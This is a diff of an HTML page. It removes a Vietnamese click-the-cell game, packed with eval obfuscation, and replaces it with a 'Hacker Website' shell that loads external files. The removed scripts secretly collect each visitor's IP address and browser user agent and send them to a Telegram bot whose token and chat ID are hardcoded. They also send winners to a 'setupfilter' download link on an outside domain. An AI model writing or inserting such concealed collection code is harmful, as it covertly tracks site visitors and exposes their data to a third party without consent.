@@ -3,91 +3,20 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Trò Chơi Tìm Ô Liên Kết</title>
-<style>
-    h1 {
-    position: absolute; /* Thiết lập vị trí tuyệt đối */
-    top: 0; /* Đặt vị trí của tiêu đề ở đầu trang */
-    left: 50%; /* Căn giữa theo chiều ngang */
-    transform: translateX(-50%); /* Di chuyển tiêu đề lùi lại phía trái 50% chiều rộng của nó để căn giữa */
-    background-color: #333; /* Màu nền */
-    color: white; /* Màu chữ */
-    padding: 10px 20px; /* Độ dày và khoảng cách giữa văn bản và viền */
-    margin: 0; /* Loại bỏ margin mặc định */
-}
-
-body {
-    background-color: #0f0f0f; /* Màu nền của trang */
-    font-family: 'Courier New', monospace; /* Font chữ */
-    color: lime; /* Màu chữ */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh; /* Đặt chiều cao của body là 100% chiều cao của viewport */
-    margin: 0; /* Loại bỏ margin mặc định */
-}
-
-.game-board {
-    background-color: #000; /* Màu nền của bảng */
-    border-radius: 10px; /* Đường viền cong */
-    padding: 20px; /* Khoảng cách giữa các ô */
-    box-shadow: 0 4px 8px rgba(0, 255, 0, 0.2); /* Đổ bóng */
-}
-
-.cell {
-    width: 30px;
-    height: 30px;
-    border: 1px solid #00ff00; /* Đường viền của ô */
-    display: inline-block;
-    text-align: center;
-    cursor: pointer;
-}
-
-.cell:hover {
-    background-color: #001f00; /* Màu nền khi hover vào ô */
-    border-color: #00ff00; /* Đổi màu đường viền khi hover */
-}
-/* CSS cơ bản cho màn hình điện thoại */
-@media only screen and (max-width: 600px) {
-    body {
-        font-size: 14px; /* Đặt kích thước font chữ nhỏ hơn cho màn hình nhỏ */
-    }
-
-    .game-board {
-        padding: 10px; /* Giảm khoảng cách giữa các ô cho màn hình nhỏ */
-    }
-
-    .cell {
-        width: 20px; /* Giảm kích thước của ô */
-        height: 20px;
-        font-size: 10px; /* Đặt kích thước font chữ nhỏ hơn cho màn hình nhỏ */
-    }
-}
-#downloadLink {
-        text-decoration: none; 
-        color: inherit; 
-    }
-
-</style>
+<title>Hacker Website</title>
+<link rel="stylesheet" href="phanmemloc.css">
 </head>
 <body>
-    <script>
-        eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 0=9("8://7.6.5/4");1 3=2(0);',10,10,'encodedLink|var|atob|decodedLink|setupfilter|vn|id|by|https|btoa'.split('|'),0,{}))
-    </script>
-  <script>
-    document.write(unescape("%20%20%3Ch1%3ETr%F2%20Ch%u01A1i%20%D4%20C%u1EDD%20L%u1EA5y%20Link%20%3Ca%20id%3D%22downloadLink%22%20href%3D%22%23%22%20download%3EDownload%3C/a%3E%3C/h1%3E"));
-    </script>
-    <script>
-        eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6.5("4").3("2",1(0));',7,7,'encodedLink|atob|href|setAttribute|downloadLink|getElementById|document'.split('|'),0,{}))
-    </script>
+<div class="hacker-background">
+  <div class="content-wrapper">
+    <div class="loader-wrapper" id="loaderWrapper">
+      <div class="loader"></div>
+    </div>
+    <button id="startBtn">Bắt đầu</button>
+    <div class="code-rain" id="codeRain"></div>
+  </div>
+</div>
 
-<div id="gameBoard"></div>
-<p id="status"></p>
-
-<script>
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 f=4.z(\'f\');1 b=4.z(\'S\');1 l=[3,3,3,3,3];h(1 i=0;i<10;i++){h(1 j=0;j<10;j++){1 2=4.q(\'R\');2.Q=\'2\';2.v(\'a-9\',i);2.v(\'a-8\',j);2.O(\'g\',5);f.s(2)}f.s(4.q(\'K\'))}h(1 k=0;k<10;k++){1 u=6.y(6.w()*10);1 p=6.y(6.w()*10);1 7=u*10+p;l[7]=U}1 d=0;e 5(n){1 2=n.16;1 9=o(2.r(\'a-9\'));1 8=o(2.r(\'a-8\'));1 7=9*10+8;x(l[7]){b.m=\'13 12\';A.F.11=\'Z://G.Y.X/V\';D()}C{d++;x(d>=10){b.m=\'Hết Lượt.\';14(e(){A.F.W()},15)}C{b.m=\'Lược Nơi \'+(10-d);2.B(\'g\',5);2.T.I=\'J\'}}}e D(){1 E=4.M(\'.2\');E.P(e(2){2.B(\'g\',5)})}',62,69,'|var|cell|false|document|handleClick|Math|cellIndex|col|row|data|statusDisplay||attempts|function|gameBoard|click|for||||links|textContent|event|parseInt|randomCol|createElement|getAttribute|appendChild||randomRow|setAttribute|random|if|floor|getElementById|window|removeEventListener|else|disableAllCells|cells|location|by||backgroundColor|Red|br||querySelectorAll|Ch|addEventListener|forEach|className|div|status|style|true|setupfilter|reload|vn|id|https||href|Luck|Good|setTimeout|2000|target'.split('|'),0,{}))
-// Lấy thông tin trình duyệt
- eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 b=N.s;a(\'8://7.r.g?q=5\').4(2=>2.5()).4(3=>{1 c=3.n;1 i=\'l:k\';1 d=\'j\';1 e=\'9 m: \'+c+\'\\o p: \'+b;a(\'8://7.t.g/v\'+i+\'/F\',{M:\'L\',u:{\'K-J\':\'I/5\'},H:G.E({w:d,D:e})}).4(2=>2.5()).4(3=>{6.C(\'B A:\',3)}).f(0=>{6.0(\'h z y:\',0)})}).f(0=>{6.0(\'h x 9:\',0)});',50,50,'error|var|response|data|then|json|console|api|https|IP|fetch|browserInfo|ipAddress|chatId|messageText|catch|org|Error|botToken|6339940126|AAHycMohej85f0YYL0o8IChstjfSu0l_loU|7112649610|Address|ip|nBrowser|Info|format|ipify|userAgent|telegram|headers|bot|chat_id|fetching|message|sending|sent|Message|log|text|stringify|sendMessage|JSON|body|application|Type|Content|POST|method|navigator'.split('|'),0,{}))
-</script>
+<script src="phanmemloc.js"></script>
 </body>
 </html>
